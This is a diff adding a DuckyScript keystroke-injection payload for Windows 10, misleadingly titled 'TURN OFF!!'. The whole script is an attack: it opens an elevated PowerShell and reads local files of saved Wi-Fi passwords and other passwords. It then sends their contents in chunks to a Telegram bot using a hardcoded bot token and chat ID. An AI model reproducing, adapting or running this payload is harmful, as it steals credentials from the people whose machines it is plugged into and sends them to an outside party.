@@ -1,0 +1,77 @@
+REM Author: JHOJY
+REM Title: TURN OFF!! 
+REM Target: windows 10 
+
+GUI r
+DELAY 500
+STRING powershell
+CTRL+SHIFT+ENTER
+DELAY 2000
+LEFTARROW
+DELAY 1000
+ENTER
+DELAY 500
+STRING $botToken = "6768371377:AAFuqIRwiJYtAvB7r0UBy6j29io-OXI2x1M"
+ENTER
+STRING $chatId = "759373298"
+ENTER
+STRING $filePath = "$env:USERPROFILE\Downloads\SavedWiFiPass.txt"
+ENTER
+STRING $fileContent = Get-Content $filePath -Raw
+ENTER
+STRING $chunkSize = 4096
+ENTER
+STRING $chunks = [System.Collections.Generic.List[string]]::new()
+ENTER
+STRING for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
+ENTER
+STRING     $chunks.Add($fileContent.Substring($i, [Math]::Min($chunkSize, $fileContent.Length - $i)))
+ENTER
+STRING }
+ENTER
+STRING $telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage"
+ENTER
+STRING foreach ($chunk in $chunks) {
+ENTER
+STRING    Invoke-RestMethod -Method Post -Uri $telegramApiUrl -Body @{
+ENTER
+STRING        chat_id = $chatId
+ENTER
+STRING        text = $chunk
+ENTER
+STRING    }
+ENTER
+STRING }
+ENTER
+DELAY 300
+STRING $filePath = "C:\Users\Public\Downloads\password.txt"
+ENTER
+STRING $fileContent = Get-Content $filePath -Raw
+ENTER
+STRING $chunkSize = 4096
+ENTER
+STRING $chunks = [System.Collections.Generic.List[string]]::new()
+ENTER
+STRING for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
+ENTER
+STRING     $chunks.Add($fileContent.Substring($i, [Math]::Min($chunkSize, $fileContent.Length - $i)))
+ENTER
+STRING }
+ENTER
+STRING $telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage"
+ENTER
+STRING foreach ($chunk in $chunks) {
+ENTER
+STRING    Invoke-RestMethod -Method Post -Uri $telegramApiUrl -Body @{
+ENTER
+STRING        chat_id = $chatId
+ENTER
+STRING        text = $chunk
+ENTER
+STRING    }
+ENTER
+STRING }
+ENTER
+DELAY 300
+STRING exit
+ENTER
